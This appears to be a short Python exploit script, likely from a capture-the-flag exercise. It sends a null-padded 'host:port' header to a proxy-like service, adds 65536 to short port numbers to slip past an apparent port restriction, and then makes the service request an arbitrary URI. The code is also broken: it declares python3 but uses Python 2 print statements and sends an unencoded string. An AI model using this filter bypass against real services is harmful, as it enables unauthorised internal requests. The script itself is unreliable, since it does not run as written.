#! /usr/bin/python3

import socket
import sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = sys.argv[1]
port = int(sys.argv[2])
remotehost = str(sys.argv[3])
remoteport = int(sys.argv[4])
uri = str(sys.argv[5])

s.connect((host,port))
print s.recv(12).decode()

# Wrap ports
if len(str(remoteport)) < 4:
    remoteport += 65536


header = remotehost + ':' + str(remoteport)
headerlen = len(header)
multiplier = 250 - int(headerlen)
padding = '\x00' * int(multiplier)
comms = header + padding
s.send(comms.encode())

payload = 'GET %s HTTP/1.0\r\n\r\n' % uri
print "Payload is: %s" % payload
s.send(payload)
print s.recv(1024).decode()